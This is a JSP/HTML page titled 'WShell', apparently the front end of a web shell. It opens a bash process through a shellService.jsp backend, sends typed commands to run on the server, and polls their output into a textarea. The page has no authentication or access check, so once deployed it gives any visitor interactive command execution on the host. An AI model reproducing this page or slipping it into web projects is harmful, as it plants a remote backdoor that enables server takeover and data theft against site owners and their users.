<%@page contentType="text/html; charset=UTF-8" %><!doctype>
<html>
	<head>
		<meta charset="utf-8">
		<title>WShell</title>
	</head>
	<body onunload="closeShell()">
		<div id="divStart">
			Shell Type: <input id="shellName" type="text" value="bash" />
			Encoding: <input id="shellEncoding" type="text" value="UTF-8" />
			<input type="button" value="Open" onclick="openShell()" />
		</div>
		<div id="divInput" style="display:none">
			<input id="cmd" type="text" style="width:75%" onkeydown="if(event.keyCode==13){execute()}" />
			<input type="button" value="Execute" onclick="execute()" />
			<input type="button" value="Clear" onclick="clearText()" />
			<input type="button" value="Close" onclick="closeShell()" />
		</div>
		<div id="divOutput" style="display:none">
			<textarea id="out" style="width:100%;height:600px" readonly></textarea>
		</div>
		<script
			src="https://code.jquery.com/jquery-2.2.4.min.js"
			integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44="
			crossorigin="anonymous"></script>
		<script>
			var key = new Date().getTime();
			var outText = "";
			var nextInputTimeout = null;
			var nextErrorTimeout = null;
			
			function openShell() {
				var name = $("#shellName").val();
				var encoding = $("#shellEncoding").val();
				$.ajax({
					url: "shellService.jsp",
					type: "POST",
					data: {fn:"open", key:key, name:name, encoding:encoding},
					success: function(resp) {
						$("#divStart").hide();
						$("#divInput").show();
						$("#divOutput").show();
						nextInput();
						nextError();
					}
				});
			}
			
			function closeShell() {
				$.ajax({
					url: "shellService.jsp",
					type: "POST",
					data: {fn:"close", key:key},
					success: function(resp) {
						clearText();
						$("#divStart").show();
						$("#divInput").hide();
						$("#divOutput").hide();
						clearTimeout(nextInputTimeout);
						clearTimeout(nextErrorTimeout);
					}
				});
			}
		
			function execute() {
				var cmd = $("#cmd").val();
				$.ajax({
					url: "shellService.jsp",
					type: "POST",
					data: {fn:"execute", key: key, cmd: cmd},
					success: function(resp) {
						if(resp == "success") {
							$("#cmd").val("");
						}
					}
				})
			}
			
			function nextInput() {
				$.ajax({
					url: "shellService.jsp",
					type: "POST",
					data: {fn:"nextInput", key: key},
					dataType: "text",
					success: function(resp) {
						appendText(resp);
						nextInputTimeout = setTimeout(nextInput, 500);
					}
				});
			}
			
			function nextError() {
				$.ajax({
					url: "shellService.jsp",
					type: "POST",
					data: {fn:"nextError", key: key},
					dataType: "text",
					success: function(resp) {
						appendText(resp);
						nextErrorTimeout = setTimeout(nextError, 500);
					}
				});
			}
			
			function appendText(text) {
				console.log(text);
				outText += text;
				$("#out").val(outText);
				var outEl = $("#out").get(0);
				outEl.scrollTop = outEl.scrollHeight;
			}
			
			function clearText() {
				outText = "";
				$("#out").val(outText);
				var outEl = $("#out").get(0);
				outEl.scrollTop = outEl.scrollHeight;
			}
			
		</script>
	</body>
</html>